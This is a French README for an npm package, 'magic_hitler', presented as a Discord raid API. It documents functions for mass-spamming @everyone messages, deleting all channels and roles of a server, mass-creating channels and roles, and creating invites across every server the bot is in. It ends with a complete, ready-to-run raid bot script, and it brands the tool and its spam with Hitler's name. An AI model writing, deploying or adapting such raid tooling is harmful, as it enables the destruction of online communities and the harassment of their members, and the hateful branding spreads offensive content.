# Magic Hitler
# Discord Raid API
[![npm](https://img.shields.io/npm/v/magic_hitler.svg)](https://www.npmjs.com/package/magic_hitler)
[![npm](https://img.shields.io/badge/taille-27Ko-brightgreen.svg)](https://www.npmjs.com/package/magic_hitler)
[![github](https://img.shields.io/badge/Disponible%20sur-GitHub-red.svg)](https://github.com/JacqueSatan/Magic-Hitler-npm-module)
[![github](https://img.shields.io/badge/et-npm-yellow.svg)](https://www.npmjs.com/package/magic_hitler)<br />
***
## Nouveautés
### **Refonte à 100% de tout le fonctionnement de l'API**
***
#### Pour installer Discord Raid Bot, éxecutez simplement la commande `npm i magic_hitler` dans le dossier de votre
application Node.Js.
Pour utiliser l'API de raid, intégrez les lignes suivante à votre code :
```javascript
const Discord = require('discord.js');
const MagicHitler = require('magic_hitler');
const client = new Discord.Client();
const raid = new MagicHitler.Client({
    client: client,
    prefix: "!" // Optionnel ; Préfixe pour les commandes
});
```


***
***
***
## **Messages**
***
### **Envoyer un message dans un salon spécifique**

| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| message | String | Non | Message à envoyer|
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
```js
raid.sendMessage(message, commande);
```
***
### **Spammer un message dans un ou plusieurs salons**

| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| message | String | Non | Message à envoyer|
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
| parametres | Object | Oui | Paramètres du spam|
| parametres.messageNumber | Number | Oui | Nombre de messages à envoyer (500 par défaut)|
| parametres.allChannels | Boolean | Oui | Spamme dans tous les salons du serveur si activé\
```js
raid.spamMessages(message, commande, {
    messageNumber: 500,
    allChannels: false
});
```

***
***
***
## **Événements**
***
### **Afficher quelques informations sur le bot dans la console**

```js
raid.ready();
```

***
***
***
## **Salons**
***
### **Supprimer le salon dans lequel la commande est envoyée**

| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|

```js
raid.deleteChannel(commande);
```
***
### **Supprimer tous les salons d'un serveur**

| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
| parametres | Object | Oui | Parametres de la suppression|
| parametres.createChannel | Boolean | Oui | Crée un salon lorsque tous les autres sont supprimés|
| parametres.createdChannelName | String | Oui | Nom du salon créé|
| parametres.createChannelMessage | String | Oui | Message à envoyer dans le salon créé|
| parametres.deleteSpecificChannels | Number | Oui | (Non compatible avec les autres paramètres) Supprime un nombre donné de salons seulement|

```js
raid.deleteChannels(commande, {
    createChannel: true,
    createdChannelName: "nom-du-salon-créé",
    createChannelMessage: "Message envoyé dans celui-ci"
});
```

***
### **Créer des salons sur un serveur**
| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
| parametres | Object | Oui | Parametres de la création|
| parametres.createChannelName | String | Oui | Nom des salons créés|
| parametres.sendMessageContent | String | Oui | Messages envoyés dans chaque nouveau salon|
| parametres.sendMessageCount | Number | Oui | Nombre de messages envoyés dans chaque salon|
| parametres.createChannelCount | Number | Oui | Nombre de salons créés (laisser vide pour que le nombre total de salons soit de 500)|
```js
raid.createChannels(commande, {
    createChannelName: "nom-des-salons-créés",
    createChannelCount: 100,
    sendMessageCount: 50,
    sendMessageContent: "Message envoyé"
});
```

***
### **Créer une invitation pour un ou plusieurs serveurs**
| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
| allGuilds | Boolean | Oui | Crée une invitation pour tous les serveurs du bot|
```js
raid.createInvite(commande, allGuilds);
```


***
***
***
## **Rôles**
***
### **Supprimer tous les rôles d'un serveur**
| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
```js
raid.deleteRoles(commande);
```

***
### **Créer des rôles sur un serveur**
| Paramètre | Type | Optionnel | Description |
| --- | --- | --- | --- |
| commande | String | Non | Commande à envoyer pour déclencher la fonction|
| parametres | Object | Oui | Paramètres de la création|
| parametres.rolesName | String | Oui | Nom des rôles à créer|
| parametres.rolesNumber | Number | Oui | Nombre de rôles à créer|
***
***
***
## **Exemple complet** de bot raid complet**
```js
const Discord = require('discord.js');
const MagicHitler = require('magic_hitler');
const client = new Discord.Client();
const raid = new MagicHitler.Client({
    client: client,
    prefix: "!"
});

raid.ready();

raid.sendMessage("Test réussi", "test");
raid.spamMessages("@everyone Raid by Magic Hitler", "spam", {
    messageNumber: 100,
    allChannels: false
});
raid.spamMessage("@everyone Raid by Magic Hitler", "spamAllChannels", {
    messageNumber: 20,
    allChannels: true
});     // On peut déclarer plusieurs fois la même fonction

raid.deleteChannel("del");
raid.deleteChannels("delAll", {
    createChannel: true,
    createdChannelName: "raid-by-magic-hitler",
    createChannelMessage: "@everyone Raid by Magic Hitler"
});
raid.createChannels("create", {
    createChannelName: "magic-hitler",
    sendMessageContent: "@everyone Raid by Magic Hitler",
    sendMessageCount: 3,
    createChannelCount: 222
});
raid.createInvite("invite", false);
raid.createInvite("inviteall", true);

raid.deleteRoles("delRoles");
raid.createRoles("createRoles", {
    rolesNumber: 69,
    rolesName: "Magic Hitler"
});

client.login('token de votre bot');
```

Plus de 400 lignes de codes résumées en 31.
